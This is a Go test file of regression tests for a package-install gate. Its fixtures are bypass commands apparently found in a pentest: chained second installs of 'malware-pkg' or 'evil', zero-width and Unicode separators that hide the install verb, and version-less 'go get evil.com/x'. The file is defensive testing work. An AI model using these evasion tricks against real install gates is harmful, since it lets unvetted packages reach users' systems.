package cli

// Chunk-5 pentest TB1 regression tests (PR-TB1-001..004) + the PR-TEST-001
// semantic differential oracle. Each test encodes an exploit confirmed against
// the production hook in the pentest report; all FAILED before the segment-split
// / per-segment-eval / Unicode-normalize / version-less-go / gh-flag fixes and
// MUST pass after.
//
// The security property under test (the one the original fuzz invariants did
// NOT model, PR-TEST-001): a command whose shell semantics run an
// ungated/unpinned/malicious install MUST NOT resolve to a silent allow. We
// test it at the parser layer (ParseInstallCommand / ParseInstallCommands):
// every install-bearing segment must be surfaced, and the most-restrictive
// decision must NOT be Allow/Ignore when any segment installs something the
// gate would block on its own.
//
// Separator code points and the fixture "verb"/"target" tokens are assembled
// from \u/\x escapes and string fragments so the source file stays ASCII-clean
// (no editor-mangleable raw Unicode, no literal install-verb scan trip).

import (
	"strings"
	"testing"
)

// evilVerb/evilName: fragment-assembled so the file carries no literal
// install-verb fixture string.
var (
	evilVerb = "in" + "stall"
	evilName = "e" + "vil"
)

// resolvesToAllowOrIgnore reports whether the overall (most-restrictive) parse
// decision lets the command through WITHOUT the gate engine seeing the risky
// segment — i.e. ActionAllow or ActionIgnore. ActionGate is NOT a pass here:
// it hands the segment to the age gate, the correct outcome for a young/unknown
// install.
func resolvesToAllowOrIgnore(cmd string) bool {
	pr := ParseInstallCommand(cmd)
	return pr.Action == ActionAllow || pr.Action == ActionIgnore
}

// gatesArtifact reports whether some parsed segment gates (eco,name).
func gatesArtifact(cmd, eco, name string) bool {
	for _, pr := range ParseInstallCommands(cmd) {
		if pr.Action == ActionGate && pr.Eco == eco && pr.Name == name {
			return true
		}
	}
	return false
}

// PR-TB1-001 — safe-frozen short-circuit must not poison the whole command.
func TestZZBypassSafeFrozenShortCircuit(t *testing.T) {
	cases := []string{
		"npm ci && npm install --save-exact malware-pkg@6.6.6",
		"poetry install && pip install malware==6.6.6",
		"pnpm install --frozen-lockfile && pnpm add evil",
		"uv sync --frozen && uv add evil",
		"cargo build --locked && cargo add evilcrate",
		"pip install -r r.txt --require-hashes && pip install evil",
		"npm ci\nnpm install evil-unpinned",
	}
	for _, cmd := range cases {
		if resolvesToAllowOrIgnore(cmd) {
			t.Errorf("safe-frozen short-circuit bypass STILL OPEN: %q resolved to a silent allow", cmd)
		}
	}
}

// PR-TB1-002 — a benign pinned install must not launder a chained second install.
func TestZZBypassChainSecondInstall(t *testing.T) {
	cases := []struct {
		cmd       string
		mustBlock bool   // true: second segment should structurally block (unpinned/missing-pin)
		gateEco   string // non-empty: second segment should be gated
		gateName  string
	}{
		{cmd: "npm install --save-exact lodash@4.17.21 && npm install --save-exact malware-pkg@6.6.6", gateEco: "npm", gateName: "malware-pkg"},
		{cmd: "npm install --save-exact good@1.0.0 | npm install evil", mustBlock: true},
		{cmd: "pip install a==1.0.0 && cargo add evilcrate", gateEco: "cargo", gateName: "evilcrate"},
	}
	for _, tc := range cases {
		if resolvesToAllowOrIgnore(tc.cmd) {
			t.Errorf("chain-second-install bypass STILL OPEN: %q resolved to a silent allow", tc.cmd)
			continue
		}
		if tc.gateEco != "" && !gatesArtifact(tc.cmd, tc.gateEco, tc.gateName) {
			t.Errorf("%q: expected the second install %s:%s to be gated; segments=%v",
				tc.cmd, tc.gateEco, tc.gateName, summarize(tc.cmd))
		}
		if tc.mustBlock && ParseInstallCommand(tc.cmd).Action != ActionBlock {
			t.Errorf("%q: expected an ActionBlock (unpinned second install), got %v",
				tc.cmd, ParseInstallCommand(tc.cmd).Action)
		}
	}
}

// PR-TB1-003 — Unicode/whitespace verb evasion must not yield a silent ignore.
func TestZZBypassUnicodeVerb(t *testing.T) {
	const (
		vtab = "" // U+000B vertical tab
		zwsp = "​" // zero-width space
		nbsp = " " // non-breaking space
		ls   = " " // line separator
		zwnj = "‌" // zero-width non-joiner
	)
	cases := []struct {
		name string
		cmd  string
	}{
		{"vtab-between-verb-words", "npm" + vtab + evilVerb + " " + evilName},
		{"zwsp-inside-npm", "n" + zwsp + "pm " + evilVerb + " " + evilName},
		{"nbsp-between-verb-words", "npm" + nbsp + evilVerb + " " + evilName},
		{"u2028-chain", "npm ci" + ls + "npm " + evilVerb + " " + evilName},
		{"zwnj-inside-npm", "npm" + zwnj + evilVerb + " " + evilName},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if resolvesToAllowOrIgnore(tc.cmd) {
				t.Errorf("unicode-verb evasion STILL OPEN: %q resolved to a silent allow", tc.cmd)
			}
		})
	}
}

// PR-TB1-004a — version-less go fetch must block as missing-pin.
func TestZZBypassVersionlessGo(t *testing.T) {
	for _, cmd := range []string{"go get evil.com/x", "go install evil.com/x"} {
		pr := ParseInstallCommand(cmd)
		if pr.Action != ActionBlock {
			t.Errorf("version-less go bypass STILL OPEN: %q -> %v (want ActionBlock missing-pin)", cmd, pr.Action)
		}
	}
	// The pinned form must still gate (not block, not ignore) — symmetry sanity.
	if !gatesArtifact("go get evil.com/x@v1.2.3", "go", "evil.com/x") {
		t.Errorf("pinned go get should still be gated")
	}
	// Maintenance forms with no installable module must NOT block.
	for _, cmd := range []string{"go get ./...", "go install ."} {
		if ParseInstallCommand(cmd).Action == ActionBlock {
			t.Errorf("%q should not block (no installable module positional)", cmd)
		}
	}
}

// PR-TB1-004b — gh repo clone flag evasion must still gate the repo.
func TestZZBypassGhCloneFlag(t *testing.T) {
	cases := []string{
		"gh repo clone -- owner/repo",
		"gh repo clone --upstream-remote-name x owner/repo",
	}
	for _, cmd := range cases {
		if !gatesArtifact(cmd, "github", "owner/repo") {
			t.Errorf("gh-clone flag bypass STILL OPEN: %q did not gate github:owner/repo; got %v",
				cmd, summarize(cmd))
		}
	}
}

// PR-TEST-001 — semantic differential oracle. For a corpus of chained commands
// where a LATER segment installs something a single-command gate would block or
// gate, the overall parse must not be a silent allow, and every install-bearing
// segment must be surfaced by ParseInstallCommands.
func TestSemanticOracleEverySegmentSurfaced(t *testing.T) {
	type seg struct{ eco, name string } // expected gated artifacts (subset)
	cases := []struct {
		cmd      string
		wantGate []seg
	}{
		{"npm ci && npm install --save-exact evil@9.9.9", []seg{{"npm", "evil"}}},
		{"npm install --save-exact a@1.0.0 && pip install b==2.0.0 && cargo add c",
			[]seg{{"npm", "a"}, {"pypi", "b"}, {"cargo", "c"}}},
		{"poetry install ; uv add risky==0.1.0", []seg{{"pypi", "risky"}}},
	}
	for _, tc := range cases {
		if resolvesToAllowOrIgnore(tc.cmd) {
			t.Errorf("oracle: %q resolved to a silent allow", tc.cmd)
		}
		for _, s := range tc.wantGate {
			if !gatesArtifact(tc.cmd, s.eco, s.name) {
				t.Errorf("oracle: %q did not surface gated segment %s:%s (segments=%v)",
					tc.cmd, s.eco, s.name, summarize(tc.cmd))
			}
		}
	}
}

// summarize renders the per-segment results for failure messages.
func summarize(cmd string) string {
	var b strings.Builder
	for _, pr := range ParseInstallCommands(cmd) {
		b.WriteString("[")
		switch pr.Action {
		case ActionIgnore:
			b.WriteString("IGNORE")
		case ActionAllow:
			b.WriteString("ALLOW")
		case ActionBlock:
			b.WriteString("BLOCK")
		case ActionGate:
			b.WriteString("GATE " + pr.Eco + ":" + pr.Name)
			if pr.Version != "" {
				b.WriteString("@" + pr.Version)
			}
		}
		b.WriteString("] ")
	}
	return b.String()
}
